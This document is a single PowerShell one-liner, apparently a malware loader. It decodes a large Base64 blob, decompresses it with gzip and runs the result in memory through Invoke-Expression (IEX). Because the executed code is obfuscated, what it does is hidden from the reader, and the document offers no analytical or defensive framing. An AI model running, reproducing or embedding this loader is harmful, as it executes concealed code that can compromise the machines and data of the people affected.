$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAL1XeW/aSBT/O3wKaxXJtpZwBJKmlSJ1IDFHMSGYK2ERGjxjM2HsofaYo9t+930+aOkm7aba1SJZmuO9N+/93olF5ZklA2ZLUxCqnI1oEDLhK+e53OmNaEnlWnmv5pzIt2V8HC/mLpXzdSDsOSYkoGGo/Jk76eEAe4p2usHB3BMk4jSvJJuYkJIooPrJSe4kOYr8EDt07mPJNnTuUbkUJISHtClar2+Eh5k/e/euHgUB9WW6LzSoRGFIvQVnNNR05bMyXtKAnt0tnqgtlT+V03mhwcUC84xsX8f2EgxCPonvOsLGsQUFa82Z1NQ//lD16Vl5Vrj9GGEeaqq1DyX1CoRzVVe+6PGDg/2aaqrJ7ECEwpGFMfMr54Vhon03Ud5MdVf1HNgWUBkFvvJjE2OZKYemwrIHyKAUQVUvtPyNWFHt1I84zyvvtWmmUD/yJfMo3EsaiLVFgw2zaVhoYp9w2qfOTOvS7QGH1zJpx0xA1ZOBns/c9xrdzcTFqThVf679URzo8HsWC3ruS+6FqCKUUxdLOpcA/VFY5U5OpsmSgj1aT4Qs4btWSnnFBCWwFMEetqeDIKL6TJnGrpvOZtmzB84w/0NB5QNXxpM6M9XjWpmOBCOz3Eni5+Q+vpgvIsYJDWKCH0fuDXWYT2/2PvaYfQhO7SWnUYfTBJDCgawLimpqdkHJTQaPGiM6fc526zH5lbeWKodscHwIWkFM6N8rkzpRU1u+ST0AMN2r4CwHUoIeqLM02B9ej/dApNY5DsO80osgJ+28YlHMKckryA9ZdoUiKZKl+k1dM+KS2TiUB3Ez/QVIs6frwg9lENngXoBhYK2pzTCPUckrTUZobW8x96CC+iImdcw5812QtAGfwEmMhSXjoAlI/u8BohcsKlvemlMPqJOKYXDsQn3IUiqJN+xSov5E7UOipFkRY3UA6UhpCACLC5lXRiyQUIPU/LPI+5fqfV+SvtOzHtDMk1qSitPaXsYJk1DacSe4/gpmAl0gATYjEF4Nh/SyGrcM39V+K96xNoLfQ8vnJmmvWLm1hc+Eb8gqLXHzhnxoPzWLpl0Pew3jCrGtu7Wvush22JXRngDdPSu1rhCpd+6bzNg2+x8QqcGZ+8DKrotI76l363W6rbBWzuSk/Ha12pyUUKVSvauUVoS2Y/oVIl2PbXcdWENtvevUgK/U4rften8xPjcex7xZrBpLZyxC67L6SHDjghNUE+ScR3jUF4Om7dWKxdFlK7aq1l1U1utFY7fsfBpGZh2Jh/O30m4YJTxuh4+D0B2Muu2+hS46T+hNyyDrhdffkIrpDvi922XV3d2+NrQ9vnocX5RSGSs0NpYP//WHjNWuWCaTUZn08c16TLFTLFN5Mf7UbA9HxkdUNvrY2PbBpsGwsZywx2Kj+HYSPPDVrsTbAqG2uzTa1pAb1rDxFIys6pvi23F7B5iPErmPonP/8EABm6VdK/VvmsWl81iqtfyLyy0XH8MJmzjFEbMN0bcMasLadN5OsEv6I14Tsuy4deDdbNEGgL3YVawroAkMKtuXbb9YLF5tyKQ7oS5CuFcvC74olsdrhBG6B51BvxpCBhHjD/3BBchelbsDRskE7t3YppHnQjL5DHSGGBp02daubasTROjoYfu7W4EHiuag9anz1CqZ+2rFrFcvTISuf4M0OcklUb+IHCet5f/QRE0chEvMIR+gER6qmCECI2tnPcFiDk17eVha0cCnHAYJGDUOuY84F3bcgH/QCWEcSJv0DGrcEJaV8xdXuvKVUP/WlQ9H7949giFZUYmTvNChviuX+dKuUipBKy3tqiU993r762K9175Ky8fd+AjK44d48pCeS6FeyiXUH/I/Y53VvOTpX8f629lPbl+Ffyl/DNKzy+8PfsUd/x6iMWYSWC2o7Zym08lrkcoC8GgWPPI0RJiT/eLR/S6SZ12YFHPq+1yu5ShHCIXsEwzt9KNypcfzXyhxIM+exAIm/KQNaqdYV1q3E+UUK1+UMwAFhZVzGPMDN4p7opL+a/msbMGUhPGz0qc2hVH2rC0W0OsojDax6ERITAxnfwFsVCV+Bg0AAA=="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();